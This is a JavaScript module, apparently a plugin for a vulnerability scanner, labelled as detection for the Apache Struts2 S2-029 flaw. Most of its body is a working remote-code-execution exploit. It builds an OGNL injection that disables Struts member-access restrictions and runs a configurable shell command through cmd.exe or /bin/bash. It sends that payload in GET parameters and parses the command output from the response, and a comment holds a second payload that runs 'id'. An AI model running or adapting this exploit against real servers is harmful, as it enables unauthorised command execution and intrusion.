module.exports={
	tags:"struts2,029,parms",
	des:"struts2 029Vulnerability detection",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-029",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-029.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-029"],
/*
(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))
*/
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this,_s = _t.self;
		parms || (parms={});
		var s1 = (_s.g_postData),s = 
			// s-045不允许下面的代码
			
			"#_memberAccess['allowPrivateAccess']=true"
			+ ",#_memberAccess['allowProtectedAccess']=true"
			+ ",#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']"
			+ ",#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true"
			+ ",#_memberAccess['allowStaticMethodAccess']=true"
			// + ",(#_memberAccess['acceptProperties']=true)"
			
			// + ",(#_memberAccess['excludedPackageNamePatterns']=true)"
			// + ",("
			// s2-048不能加下面的代码
			
			
			// + ".(#_memberAccess['acceptProperties']=true)"
			// + ".("
			//,szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);

			s = "(" + s + ",#mtx=new java.lang.Boolean('false'),#context['xwork.MethodAccessor.denyMethodExecution']=#mtx"
			+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
			+ ",#cmds=(#iswin?{'cmd.exe','/c','" + _s.g_szCmdW + "'}:{'/bin/bash','-c','" + _s.g_szCmd + "'})"
			+ ",#p=new java.lang.ProcessBuilder(#cmds)"
			+ ",#as=new java.lang.String()"
			+ ",#p.redirectErrorStream(true),#process=#p.start()"
			+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
			+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
			+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			+ ",#as.toString()"
			+")";
		// console.log(encodeURIComponent(s));
		// console.log(url);
		var xC = encodeURIComponent(s);
		var a = "message=" + xC + "&" + xC + "=", x = 0;
		// console.log(parms);
		for(var k in parms)
		{
			a += "&"+k + "=" + xC + "&";
			x++;
		}
		// if(0 == x)return;

		_s.request(_s.fnOptHeader({method: 'GET',uri: url + "?" + a
			/*
			,"formData":{"message":s}
		    ,headers:
		    {
		    	"User-Agent": g_szUa,
		    	"Content-Type":"application/x-www-form-urlencoded"
		    }//*/
			})
		  , function (error, response, body)
		  {
		  		_s.error(error);
		  		// console.log(error || body);
		  		if(body)
		  		{
		  			_s.fnShowBody(body);
		  			var k = "whoami:\n",i = body.toString().split(k);
		  			if(1 < i.length)
		  			{
		  				i = k + i[1];
		  			}
		  			else i = i[0];
		  			k = "cmdend\n",i = i.split(k);
		  			if(1 < i.length)
		  			{
		  				i = i[0] + k;
		  			}
		  			else i = i[0];
		  			_s.fnDoBody(i,"s2-029",url,null,function(o)
			    	{
			    		var r = {"url":url,"send":a};
		  				fnCbk(_s.copyO2O(r,o),_t);
			    	});
		  		}
		    }
		  );
	}
};